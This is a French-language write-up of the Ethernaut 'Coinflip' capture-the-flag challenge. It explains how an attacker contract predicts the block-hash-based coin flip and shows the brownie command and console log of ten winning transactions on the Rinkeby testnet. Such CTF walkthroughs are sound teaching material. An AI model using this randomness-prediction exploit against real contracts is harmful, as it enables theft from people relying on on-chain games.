# Coinflip

## Objectif
L'objectif de ce challenge est de 'deviner' correctement 10 fois le résultat de coinflip.

## Deviner le résultat de coinflip

La méthode [`flip` du contrat](contracts/coinflip.sol#17) utilise la variable `lastHash` pour éviter que `flip` ne soit appellé plusieurs fois pour le même bloc.

La valeur résultat de `flip` étant seulement dépendant du numéro de bloc de la transaction, il est possible de calculer ce résultat par un autre contrat et faire l'appel à `flip` ensuite.

La méthode de calcul a été copié dans la [méthode `hack` du contrat `CoinFlipAttack`](contracts/coinflipAttack.sol#16)

Une fois le calcul effectué, l'appel à[`flip`](contracts/coinflipAttack.sol#22) est réalisé.


## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run ./scripts/attack.py main "0x1fc17cF30D907eAbf342a041632A4b345e952566" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

CoinflipProject is the active project.

Running 'scripts/attack.py::main'...
Target contract: 0x1fc17cF30D907eAbf342a041632A4b345e952566
Transaction sent: 0x6055fafd1c9221ba10c249a0c5143cd103fd69904e8e215e374971bdb3de0f3b
  Gas price: 1.000000009 gwei   Gas limit: 281425   Nonce: 203
  CoinFlipAttack.constructor confirmed   Block: 10289520   Gas used: 255841 (90.91%)
  CoinFlipAttack deployed at: 0xf5539F7dC61469cbFba58ff6C2591695cf05cD7d

Attack address: 0xf5539F7dC61469cbFba58ff6C2591695cf05cD7d
Transaction sent: 0x19f32772b81858b642e453f7255b6435ab6ad6ef5407259273d5be07c908755d
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 204
  CoinFlipAttack.hack confirmed   Block: 10289521   Gas used: 76105 (84.56%)

Transaction sent: 0x3d703bee4ca13e13beaaebbc468f9f39288269290ea93151c738421daa6c56ff
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 205
  CoinFlipAttack.hack confirmed   Block: 10289522   Gas used: 41905 (46.56%)

Transaction sent: 0xad802eb2584b683d7bc738c570ae2822735c6c8505b3c63ee5cd3f7e0201acb8
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 206
  CoinFlipAttack.hack confirmed   Block: 10289523   Gas used: 41905 (46.56%)

Transaction sent: 0xa7e262edc996e338845c758522a1d3bf298b7957bf49620cce1e0d7ff7ed4db1
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 207
  CoinFlipAttack.hack confirmed   Block: 10289524   Gas used: 41905 (46.56%)

Transaction sent: 0x87557ef0e6bf0615c89b00c5cd75139815c1a45d76198e12810819832fa16e3f
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 208
  CoinFlipAttack.hack confirmed   Block: 10289525   Gas used: 41925 (46.58%)

Transaction sent: 0x40a4182a177d87c723ac27d379cccf5e1aa2c7666a090d5952383c536ca4e56b
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 209
  CoinFlipAttack.hack confirmed   Block: 10289526   Gas used: 41905 (46.56%)

Transaction sent: 0x683238dc1dc594b554fbc49d91a2aae8a80ad327771228f3b904660a601fb153
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 210
  CoinFlipAttack.hack confirmed   Block: 10289527   Gas used: 41905 (46.56%)

Transaction sent: 0xf52f55453171cc0d5d27a54b6e08a2d96fc1070c0d4e17a48d22fe0b1908d90b
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 211
  CoinFlipAttack.hack confirmed   Block: 10289528   Gas used: 41925 (46.58%)

Transaction sent: 0x139d1fc05c0dbf17be01cd0ea6996bd723b012e6a04ef0680a04880591b94020
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 212
  CoinFlipAttack.hack confirmed   Block: 10289529   Gas used: 41905 (46.56%)

Transaction sent: 0xfa8df48b04ab79d7a4b66a8ce754c91b74178fa769fbbdbd40e3db19278c0362
  Gas price: 1.00000001 gwei   Gas limit: 90000   Nonce: 213
  CoinFlipAttack.hack confirmed   Block: 10289530   Gas used: 41925 (46.58%)

Nb ok: 10
Transaction sent: 0x74e680e4d438abef20ed6780d1ea36577e4c35f3a4a6dbc119563a623b2253eb
  Gas price: 1.00000001 gwei   Gas limit: 28821   Nonce: 214
  CoinFlipAttack.destroy confirmed   Block: 10289531   Gas used: 26201 (90.91%)
```


